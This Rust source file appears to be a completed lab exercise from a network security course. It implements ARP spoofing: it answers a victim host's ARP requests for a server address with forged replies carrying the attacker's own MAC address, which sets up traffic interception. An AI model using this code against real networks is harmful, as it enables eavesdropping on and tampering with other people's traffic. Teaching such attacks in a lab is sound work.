use crate::constants::{SERVER_IP, VICTIM_IP};
use anyhow::{Context, Result};
use log::info;
use pnet::packet::arp::{ArpOperation, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::{MutablePacket, Packet};
use pnet::util::MacAddr;
use std::net::Ipv4Addr;

pub struct ArpHandler {
    own_mac_address: MacAddr,
    expected_victim_ip: Ipv4Addr,
    expected_asked_ip: Ipv4Addr,
}

impl ArpHandler {
    pub fn new(own_mac_address: MacAddr) -> Self {
        Self {
            own_mac_address,
            expected_victim_ip: VICTIM_IP.parse().unwrap(),
            expected_asked_ip: SERVER_IP.parse().unwrap(),
        }
    }

    /// Handle a raw ARP packet.
    ///
    /// ## Returns
    ///
    /// - Ok(Vec<u8>) to send a response
    /// - Ok(None) to ignore the packet
    /// - Err on error
    pub fn handle_packet(&mut self, packet: &[u8], _options: ()) -> Result<Option<Vec<u8>>> {
        // TODO: Exercise 1.2
        // Implement the handling of an ARP packet. This function should perform
        // the ARP spoofing by sending valid ARP replies to the victim host.
        // Once correctly implemented, you should pass test cases #0 and #1.
        let arp_packet = ArpPacket::new(packet).context("Invalid ARP packet")?;

        if !self.should_intercept(
            arp_packet.get_operation(),
            arp_packet.get_sender_proto_addr(),
            arp_packet.get_target_proto_addr(),
        ) {
            // info!("Not intercepting ARP packet:");
            return Ok(None);
        }

        match arp_packet.get_operation() {
            ArpOperations::Request => {
                let mut arp_data = vec![0u8; ArpPacket::minimum_packet_size()];
                let mut arp_pkt =
                    MutableArpPacket::new(&mut arp_data).expect("cannot build arp packet");
                arp_pkt.set_hardware_type(arp_packet.get_hardware_type());
                arp_pkt.set_hw_addr_len(6);

                arp_pkt.set_protocol_type(arp_packet.get_protocol_type());
                arp_pkt.set_operation(ArpOperations::Reply);

                arp_pkt.set_proto_addr_len(arp_packet.get_proto_addr_len());
                arp_pkt.set_sender_hw_addr(self.own_mac_address);
                arp_pkt.set_sender_proto_addr(arp_packet.get_target_proto_addr());
                arp_pkt.set_target_hw_addr(arp_packet.get_sender_hw_addr());
                arp_pkt.set_target_proto_addr(arp_packet.get_sender_proto_addr());

                arp_pkt.payload_mut().copy_from_slice(arp_packet.payload());

                info!("Replying ARP: {:#?}", arp_pkt);
                Ok(Some(arp_data))
            }
            _ => Ok(None),
        }
    }

    fn should_intercept(
        &self,
        arp_operation: ArpOperation,
        sender_ip: Ipv4Addr,
        target_ip: Ipv4Addr,
    ) -> bool {
        matches!(arp_operation, ArpOperations::Request)
            && sender_ip == self.expected_victim_ip
            && target_ip == self.expected_asked_ip
    }
}
